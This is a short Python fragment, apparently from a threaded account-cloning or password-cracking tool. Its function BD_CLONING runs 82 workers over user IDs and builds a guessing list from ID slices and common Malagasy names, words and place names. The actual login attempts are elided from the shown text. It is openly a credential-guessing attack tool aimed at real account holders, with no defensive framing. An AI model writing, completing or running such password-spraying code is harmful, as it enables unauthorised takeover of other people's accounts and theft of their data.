...
def BD_CLONING():
    ...
    with tred(max_workers=82) as Dipto:
        ...
        for psx in user:
            ids=code+psx
            passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:], 'fanantenana','Fanantenana','rakoto','Rakoto','mamiko','Mamiko','Mamako','mamako','Jesosy','jesosy','heritina','Heritina','Mihinana','mihinana','matory','Matory','fanasina','Fanasina','Fanomezana','fanomezana', 'randria', 'Randria', 'Malala', 'malala', 'Malalako', 'malalako', 'nomena', 'Nomena', 'Solofo', 'solofo', 'mendrika','malagasy','Malagasy','pizza','Pizza','mahaleo','Mahaleo','mamiko','Mamiko','nirina','Nirina','Tacos','tacos','mahamasina','Mahamasina','Fanantenana', 'fitiavana', 'Fitiavana', 'nirina', 'Nirina', 'sariaka', 'Sariaka', 'faneva', 'Faneva', 'fanafody', 'Fanafody', 'nomenjanahary', 'Nomenjanahary', 'santatra', 'Santatra', 'Barbie', 'barbie', 'mijery', 'Mijery', 'nantenaina', 'Nantenaina', 'mofo akondro', 'varotra', 'Varotra', 'anjara', 'Anjara', 'maman', 'Maman', 'Ankatso', 'ankatso', 'fandresena', 'Fandresena', 'Mofo akondro', 'cntemad', 'CNTEMAD', 'Ambodivona', 'njaka', 'antananarivo', 'Antananarivo', 'malagasy', 'Malagasy', 'rabe', 'Shoprite', 'shoprite', 'Karoty', 'Koloina', 'koloina' , 'karoty']
